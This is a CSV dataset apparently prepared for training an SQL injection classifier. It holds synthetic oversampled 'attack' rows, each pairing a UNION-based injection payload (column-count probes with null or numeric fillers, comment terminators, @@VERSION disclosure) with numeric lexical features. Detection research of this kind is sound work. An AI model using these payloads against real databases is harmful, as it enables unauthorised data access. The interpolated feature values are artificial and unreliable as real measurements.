id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000271,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000087,0.27529661291880325,58.57700114983915,14.0,3.0252864328399713,44.86160091987132,1.0,4.0,8.71540022996783,0.7654945460518645,0.017252726974067767,0.06901090789627101,0.14824181907779674,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.71540022996783,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000272,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.4622914500461783,59.9287397659952,18.4643698829976,3.545360055459011,42.107283138329336,1.0,10.464369882997602,6.3570867446682655,0.702416829061191,0.016712745226230924,0.17410146808849672,0.10676895762408137,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.357086744668266,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000273,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.3189336828497028,72.5422543572315,31.5422543572315,4.34281676967282,42.0,3.542254357231501,17.0,10.0,0.579000250570068,0.04878530263488842,0.23435724427836083,0.13785720251668285,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.5422543572315,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000274,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000193,0.8674725446059773,60.76866076447616,24.845773842984105,3.986922917581926,27.769484104677264,12.383918712137525,16.0,4.615257947661368,0.4609724436184953,0.1992664277981706,0.2644625393125017,0.0752985892708324,0.0,1.0,0.3076289738306841,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3076289738306839,1.307628973830684,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000275,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000143,0.18597701295262373,70.01306093121619,16.0,3.124878054498938,49.21044874497295,1.0,8.0,11.802612186243238,0.7025374281519794,0.014332731154120676,0.11466184923296541,0.1684679914609345,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.8026121862432385,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000276,attack,union,"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",nearest_attack_euclidean,R000278,0.06918220675760232,81.92255314150205,20.0,3.6571839263830386,13.999999999999998,40.15489371699589,13.767659424506162,14.0,0.1708969902467944,0.49021328645328976,0.16799273305312143,0.17089699024679442,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.9612765707510271,0.0,0.0,8.038723429248973,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000277,attack,union,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",nearest_attack_euclidean,R000141,1.2714715648042425,59.87665511058757,20.696665015798224,3.613766452440786,13.999999999999998,32.179990094789346,4.0,9.696665015798224,0.23655515901232516,0.5336898846158002,0.06758718828923577,0.16216776808263877,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.6516674921008879,0.0,6.044997523697336,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000278,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000170,0.08678139150873379,63.31585421189912,21.0,3.655664949647456,13.999999999999998,20.379025054278948,17.87365831524035,11.063170842379824,0.22126071777199657,0.3212788637054993,0.28274735769644654,0.17471306082605753,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.9684145788100875,1.0,0.0,3.0947562635697374,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000279,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000046,0.4560240461057924,75.64576631253689,25.645766312536885,3.832690457828179,40.0,2.354233687463113,24.0,9.291532625073772,0.5288016399120218,0.031163197828442596,0.3172809839472131,0.12275417831232242,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000280,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000176,0.018061344407778342,71.09581989693002,22.009581989693,3.8651673225204446,13.999999999999998,32.07665591754402,14.0,11.019163979386004,0.19694983853990256,0.4511174288721726,0.19694983853990256,0.15498289404802226,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,6.019163979386004,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000281,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000069,0.5807339707378572,59.240073906813244,18.569944569890065,3.615868285242577,13.999999999999998,31.240073906813244,4.0,10.0,0.2364996920549448,0.5270006158901104,0.06757134058712709,0.1689283514678177,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.18998152329668863,0.0,5.810018476703311,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000282,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000190,0.4378924893416055,58.83292462308029,19.0,3.6255267270239107,41.26633969846423,1.0,11.0,5.566584924616057,0.7008741782505048,0.01709065892232675,0.18799724814559438,0.09403791468157408,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.566584924616057,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000283,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000155,0.2878722101217638,74.4568112815331,16.0,3.0825842731459883,52.76544902522649,1.0,8.0,12.691362256306622,0.7085816005771729,0.013443882268062757,0.10755105814450243,0.17042345901026185,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.691362256306622,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000062,0.9236153611696364,72.8766713392352,29.684992991147197,4.180764972355358,25.0,22.246657321529593,18.63001401770561,7.0,0.34310871180914415,0.30569054335744855,0.25513030552684696,0.09607043930656037,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.4383356696176013,0.0,0.0,1.5616643303823987,2.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000285,attack,union,"1'  )   where 9091  =  9091 union all select null,null,null,null#",nearest_attack_euclidean,R000225,1.0084472442759285,62.86052191501577,21.28684063833859,3.74589753522357,35.95087914888188,7.098241702236239,13.286840638338589,6.524560425559059,0.5760134279263105,0.10979148720060816,0.21087838864884276,0.10331669622423861,1.0,0.0,0.0,0.0,0.0,0.7622802127795301,0.0,1.0,0.0,0.0,2.7622802127795305,0.7622802127795298,1.0,0.0,0.0,1.0,0.0,0.7622802127795298,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.76228021277953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.76228021277953
SMOTE_000286,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,0.700109054536883,62.0,20.579846598223487,3.752570161030927,13.999999999999998,22.319386392893946,15.680613607106054,10.0,0.22580645161290322,0.35999010311119267,0.25291312269525895,0.16129032258064516,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.4201534017765134,0.0,0.0,3.5798465982234866,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000287,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000249,0.6231710041796104,69.4170644898525,23.93522938776139,3.904212297740487,37.54660571432973,9.0,14.93522938776139,7.935229387761391,0.5369192673560252,0.13182121178487807,0.21689356501255647,0.11436595584654019,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9352293877613906,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000288,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000297,0.06038369775851823,70.0,19.212548307474755,3.660513073568426,13.999999999999998,40.0,4.0,12.0,0.2,0.5714285714285714,0.057142857142857134,0.17142857142857143,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000289,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000203,0.6176301097276153,65.83133881258259,21.0,3.4658491189914216,13.999999999999998,37.46507105006607,4.0,10.366267762516516,0.21379544500708522,0.5678792311351646,0.061084412859167214,0.15724091099858295,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.366267762516517,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000290,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000070,0.2907026006122672,75.9003041433297,19.299087570010897,3.403607533514708,13.999999999999998,44.0,4.0,13.900304143329702,0.18445539333217265,0.5797169504725427,0.05270154095204932,0.18312611524323533,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.9003041433297011,0.0,9.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000291,attack,union,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000212,0.7943728939858502,74.80554393751194,17.0,3.212966491454285,42.644435150009556,1.0,18.0,13.161108787502389,0.5690433600669978,0.01342771162401174,0.2416988092322115,0.17583011907677884,0.0,1.0,2.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,6.161108787502389,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000292,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000307,0.2553148667046253,68.63714629019381,14.0,2.9193166037837766,52.909717032155044,1.0,4.0,10.727429258038761,0.7707795934715209,0.014610203264239563,0.05844081305695825,0.1561693902072813,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.727429258038761,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000293,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000160,0.5784386107573903,77.42984437321647,23.953229582144314,3.844373372262565,43.95322958214432,9.0,14.953229582144314,9.523385208927843,0.5676152798458793,0.11627771496353292,0.1929426427411621,0.12316436244942561,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.523385208927843,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000294,attack,union," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.22522332683431756,73.0,32.31932470672298,4.369865714206487,42.0,3.680675293277016,17.0,10.319324706722982,0.5753424657534246,0.05042020949694545,0.2328767123287671,0.14136061242086279,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000295,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000201,0.19776355439691778,67.20845099757473,17.0,3.23146281073048,45.58309800485054,1.0,8.625352992724181,12.0,0.6784509669990373,0.014880283149994594,0.1281053520510323,0.1785633977999358,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.1042254987873636,1.0,0.0,6.895774501212637,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000296,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000171,1.1121035417058724,58.585930230409346,24.757790691228042,4.002271918466366,23.140697695906532,15.445232534502814,14.828139539181306,5.171860460818694,0.39572428102884505,0.26287262271405,0.2532604352968925,0.0881426609602124,0.0,1.0,0.5859302304093468,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.585930230409347,1.5859302304093468,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000297,attack,union,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",nearest_attack_euclidean,R000100,0.49398124929371984,61.49764748549709,20.748823742748545,3.84819268858587,13.999999999999998,25.00470502900582,12.492942456491273,10.0,0.22769702559221525,0.4070828419748469,0.2025793998670698,0.16264073256586803,0.0,1.0,3.0,0.0,0.0,0.0,0.0,1.7488237427485456,0.0,0.0,4.251176257251454,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000298,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000081,0.45408809153774954,69.57209057372734,17.0,3.2019130123896287,48.05767245898187,1.0,8.0,12.514418114745467,0.6906193798425223,0.014392186862825979,0.11513749490260806,0.17985093839204358,1.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,7.514418114745467,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000207,1.4317207568778711,63.0,17.0,3.2603362287098485,38.0,1.0,14.0,10.0,0.6031746031746031,0.0158730158730159,0.2222222222222222,0.15873015873015872,0.6195018901737248,0.38049810982627524,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,5.0,0.0,0.6195018901737248,0.3804981098262751,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000300,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000224,1.099637320920891,58.04737807433936,24.0,3.941708082800396,25.094756148678734,12.444725579937407,14.0,6.5078963457232275,0.4281107018673271,0.21809295311687854,0.24182912278964197,0.11196722222615241,0.0,1.0,2.4921036542767725,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0157926914464555,3.4921036542767725,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000301,attack,union,"1' in boolean mode  )   union all select null,null,null#",nearest_attack_euclidean,R000254,0.3422730209323399,57.73374527320157,19.0,3.634241975910198,40.38699621856125,1.0,11.0,5.346749054640314,0.6991492755910631,0.017388055932575336,0.19126861525832867,0.09219405321803294,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.3467490546403136,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000302,attack,union,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000114,0.02856361611331347,79.85065803475523,21.98506580347552,3.656442420806991,50.880526427804185,9.0,10.0,9.970131606951044,0.6371533132949674,0.11274001387271479,0.12526668208079425,0.12483999075152345,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,6.970131606951044,3.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000303,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000138,0.2107275503276513,72.86904018336644,21.886904018336644,3.7425393280643124,13.999999999999998,43.09523214669315,4.0,11.773808036673287,0.1925323981066026,0.5909648249128314,0.055009256601886464,0.16149352037867948,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.773808036673287,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R000132,1.620858138949593,69.42964826874608,24.0,4.001499012993377,19.0,32.0,10.0,8.429648268746075,0.273672191075326,0.46092158496897007,0.14403799530280315,0.12136822865290074,1.0,0.0,1.8592965374921508,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,2.859296537492151,1.0,0.0,0.4296482687460753,0.5703517312539246,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
